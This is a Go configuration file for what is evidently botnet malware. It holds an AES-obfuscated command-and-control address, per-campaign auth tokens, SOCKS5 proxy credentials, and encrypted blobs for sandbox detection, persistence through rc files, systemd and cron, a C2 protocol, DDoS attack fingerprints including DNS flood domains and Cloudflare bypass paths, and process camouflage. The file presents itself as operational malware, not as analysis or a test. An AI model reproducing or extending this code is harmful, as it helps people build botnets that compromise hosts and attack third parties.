package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "779aabbf" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "McDPahp5&tAo$F1y" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "r4.6-stable" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "7emOZVbqgcAC"    //change me run setup.py
var proxyPass = "BUdiLg8CT4Nt"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	binLabel    string
	unitPath    string
	unitName    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("1606da6b491513fcc5559301b21135c2a8e0c66cce31325244d05c014cb56547e1e21b31abbf8c41ceef91ef12e022ab2a2c03224e8edc9e657f730879597d531dfbbd9780456d9d") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("aeaf96c80ac8ef3cdc55da3d18884f29da6cdde403e4896a0cfc539a7b9691019087a0f311e45df639a92b5241d221e49eb05328895e6a883b720d40e176fd1799e2e97c11b7d6cf2e8c85e79f18ffc12dec601007b626ad5e9f470f7ea6ece699934019b4d7294c2526f1694f5e70fdafc56e8959")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("2036186896ffd08b20a419d20551814a48c8ed1003aeef204cc0113f7e0bd315eb14505778ed8c86871dbb6fa247cccd0f00e356e4746b5046f9bbb0c12fd68943843ca726f44d047f75")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("8cb258cfdd909d367475ce22712079b83a14c801bda90d17a205ddbfb19b1738")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("9837a03f1fa9a9476e73ebc610152a183782a9953b4bc9d87eead10bde")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("826f75ffb07b32c874bb6a0b409e92485e456c3297569b29acf060086f7b6a8198ef2d2659")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("a5b6e93a92376385143dbe264f7ba8d223ec0f951320140b825d657657")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("1867b8d99e4a449a730bc3f323f68e0a5dbf74c89442fd07f7eff4e87291cead0af88314486e895f62af4132d91457e1fe9007c91fa822")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("993da379004d0d9eb1bb52884d6c5517c342b5d9e448abcbe8d9e791f8b92dd2b7da95")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("57c20688bf4c24cf437f4749acb722822692389f6e3c867c5c")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("da06a86ac545485618bf7a7919bc4ab56d2add27c1389a718257d27030")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("e38536a0c9f444d771ecfe1e9c0488d3d4a694b1380374e5e6793c39fbe88df8873b4364e14651")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("51f400863f5e101c74dbfd9a4636b3d8e8de5067eb0713a35dd16824c3d9b090f0ab04cc5469093639b766")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("51102ac30c14bdc8a0aec0c6e984328669405d1c226190871c484a228858d5")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("0a33ace30d03665720d654f6e1f6da1af04ab705e980b932e9a5c82a")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("68f8f6692042dbfdc819c8874635bd122e5b7f5e0fa0926adf9bc35f098a565ba8291fd4c4b9680dfeb9ccfe01c5cdef")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("6d2aa08df567e017b1edc2ab7f2e3b3f5ffb7cca")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("e550c0cd67d3520a4e6929ee3869b03d5b967b79ed")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("2fb9ef3e22ac4296e972719999efe1ec351dbbf34d7b7df96476913f6f369f")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("d0e96d554b94983f6b27c2cc96f53bb2c6ccc6b08fc61222f8c1")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("851662792dd22ec02a7ae4c2e4b83be3937005dd15c2e027a141a5")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("6524f8b69c86f623aef3ab6d3c2dd1ad8a3264af70a5d6203a7efa")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("54ebbb24fb50c16dc39e0b1e7855b78c8fb34515feb8d28751152e07e57b63")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("a5e595a6538780fe3d079ece273f3fd66712d5a6b84fbd0accda4f04660a067f9cfd66b2ee3d3111b61ba296ab91bdd583b8ffea76")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("4efc48bbdd268ef5c4b1490d1de9be99f7bc7c5e5b86a2e87f")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("34cf769cc98a05ebf5e9abea104651bbfa7d96d13cff910e527b8deb24c5d893ef86")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("b2c3f89a2f2003317ce6922e456f684ae3b1f71e93528150c7fea833172c9270e26f05532986dd448440488e5670")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("410dd4700b5a6be89a438aacf27ff599b78a3a7f60c03e10730fbfa5405b48bdf7acae39e7fc48d859f508b6")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("2a100b36faccf04c411f7bbfa0ccba59ff96e779538d85efc221565dac04edaa88173b94854988c50613d8816e8da56a2a3ab243e9e754aa506c")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("be4f22b324e3f5de0f2ce0a2f4318b7f468bfc4823c525e2b6cac101ae3bd400")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("95169f6e6c33e9757655c4c71238ce8a1e2541d8cd2caea7dfeb143ae80d1021898da62eaa944c4e16c7ceabf77c9fe7")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("53de6b25eb9044a55e0953abf0b110febec2587fe9c4cbce986b3fc2b199aeff6dbbc62ccc")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("a1a982300728a083b8a25d239442989be0446f6aa71d49c357d113e088157912f3fd09e7183e691d3443071de056da")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("96e162d1e2b6b863b6766efeca8a40b6bcef09548d5c29f4a196ba2f87934639637c88f0bcaea8a5f525015681f3dee9f5e20e8e295ec54e776220165b46341e38e36af10ad5f5a3a69c8666d1a8d10901fa358e7b9470f891ba37fe5248164db5e32ba9034579b04476fcc357bcdd1d36")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("4c19bbd02dfc04eb87d7debc5baf74e60754e44da96eae61c48056497536ff0e42e601fd6daa0ad8e68d5305c8f44a487a08b750cb33c00d2d776036a6d76151dc43e199ad14078c616ce4d1d4c58594ec")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("a7eba355d2c5818e6f1bc9174ba35169fc0f932f54b1da9be253fa7f04d3fc08f0ac0a00f13e521cc58a571a7a121fc9e93c1dacebe3d98dfdcc1134832b738e40ebbf5107d1ccf7f34e344827bc")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("b5a9ae52e2db38bbf3d2c86e4d001555635db5f2ab04b6ccb656668cdd9ab6d7786773a5d23bb90771a41d3cf9fa5ac2d9cc5f307c26b88f7f29c049524e07d777b51652db54ccd0b4ea2fe286")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("736a5964be0a2a18241f54df127f8de150c0798281126c6f4e11704b4e2481557b0b1a2c08065c1687f046d8379f8e33e950c999a8fa6b79f7a9693bda5c7b")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("71a5268b26cd50463f1d76b3715bd229001c34b640ef9ec00bedc2832698c54fd3db5237")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("7485739825e6af5bdb39ce1bc590802d2f6b8081684986f17fa8b111035a65d3b3d0e7fc1552404ff1ed9c68f07c2775dd76eafebf4e019c17db4d8e169533811a2cbb6d23785096a8042e971aa09b05a8bac8d6930c8281555f437795a8b8dd0ba5e9433562dc390c9865e447b4ad8e8eccbeb00506589efb5ea1869f5574ac1cd0ac432599e1ed1060759c555a52a3dc1eb97707fbc189e5b8ada94a366f83f015d57125b8a02dbf34598974a052ca2bce2bb135a52b97ea908ebc186fcac489f8c7f726edc7f78d6f6ff4912e65d2d7f7a6b41a25efda4f089d7320")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("97069b05a897cc7099948970d9146500d54483474043be78326bbf7b77191aff4e56c911910a4832f0269539b92d0993796d17b96e795f66611ec53fd68733a1a1921181bf849caa3a3228d318dbc6991a77e464797eccaaf75f28")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("bbc875ea936b5a47a63b2da8f1d4ad40b94c9bc6b305da622795f2afbd29a0636382bc799a5c07a0a19b9c14c195b1d9a6737da3281358648d4b37")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("70fd59b9e84522b545f1513ec42f1f82106f4c7d222d98afafef25572c07fead1d7121f569bd7be1c667ee57e6c40aa0ccc100a7cbce7640fd4ca675f3117a5db1bcabb6719962d561")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("ee5e3499045b4d26ef6245fac3003464706a036c71a246")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("15864aec5ec540fb7b9d48366c1c6e6ba7d1812c7a69908c7999f0d78b1446d2ebff")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("420d6252d6931c1768a65dcd2163452a5a7740b0425aa6616123767c8f68a1a58bce288de9855d59ed04641971cf05d278b8e99faae7a9135c2ba5d7d285504137b2301a62ae65d84e03640f497fb3ddd2a96f898c724cc785ef36cfaecde9")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("40fb2722f03d1b1226c4a4cca3edb41e11fd")

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("6f8cc0389aef5be386e898171d9eb9b1cc71dd353bde1b5d54bfa7ed0ca1b6c727db2f09d892c31fc4cb3da1f94184b0c51bdf7119")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("648cba5ff86c722481ce607b848386508eb8")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("9c7c594fea108a06de589162d5db5891a8e4")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("cc2b25c7e0da02a6836cbf31679df175f3f097088dcb")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("5cfb7f41cb85f8ce0ced024f4416ede94c3cae78f2a76525")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("02e11ff854274ad7b9fa35e6fae6ce976d63b9daf3")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("ce3ce333c7a1bfdd9d1ccfeac78de0d249cd")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("3ef8267e26b8583da5cda5da1f53e9ef09235af0ba355c6aa4")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("c92bbd44597f4699ce52b0e060251b908b18ee70b34fa9b8ad")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("a3fcfe176d160256e10b8ecddbaf7811f52cb6f0960c23")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("3a81048d28442ba554de44a66184d1bca1c03d20")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
